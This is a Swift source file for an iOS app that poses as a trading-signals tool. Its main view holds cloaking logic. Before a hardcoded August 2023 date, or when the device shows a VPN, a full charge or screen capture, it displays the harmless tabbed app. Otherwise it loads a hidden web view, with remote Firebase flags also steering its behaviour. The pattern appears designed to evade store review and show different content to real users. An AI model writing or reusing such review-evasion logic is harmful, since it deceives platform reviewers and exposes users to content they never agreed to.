//
//  ContentView.swift
//  App168
//
//  Created by IGOR on 07/08/2023.
//

import SwiftUI

struct ContentView: View {
    
    @State var isDead: String = ""
    @State var server: String = ""
    
    @State var current_tab: Tab = Tab.Signals
    
    @State var telegram: URL = URL(string: "https://")!
    @State var isTelegram: String = ""
    
    @AppStorage("status") var status: Bool = false

    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if isDead.isEmpty || server.isEmpty || telegram.absoluteString == "https://" || isTelegram.isEmpty {
                
                LoadingView()
                
            } else {
                
                if server == "0" {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        USplash()
                    }
                    
                } else if server == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                SignalsView()
                                    .tag(Tab.Signals)
                                
                                CalendarView()
                                    .tag(Tab.Calendar)
                                
                                NewsView()
                                    .tag(Tab.News)
                                
                                CalculatorView()
                                    .tag(Tab.Calculator)
                                
                                MoreView()
                                    .tag(Tab.Settings)
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        
                    } else {
                        
                        Splash()
                    }
                }
            }
        }
        .onAppear {
            
            check_data(isCaptured: false)
        }
    }
    
    private func check_data(isCaptured: Bool) {
        
        getFirebaseData(field: "isDead", completion: { result1 in
            
            isDead = result1.absoluteString
            
            getFirebaseData(field: "telegram", completion: { result2 in
                
                telegram = result2
                
                getFirebaseData(field: "isTelegram", completion: { result3 in
                    
                    isTelegram = result3.absoluteString
                })
            })
        })
        
        let data = MyDataClass.getMyData()
        let now = Date().timeIntervalSince1970

        var dateComponents = DateComponents()
        dateComponents.year = 2023
        dateComponents.month = 8
        dateComponents.day = 21

        let targetDate = Calendar.current.date(from: dateComponents)!
        let targetUnixTime = targetDate.timeIntervalSince1970
        
        guard now > targetUnixTime else {

            server = "1"

            return
        }
        
        if data.isVpn || data.isFullChrg || isCaptured {
            
            server = "1"
            
        } else {
            
            server = "0"
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
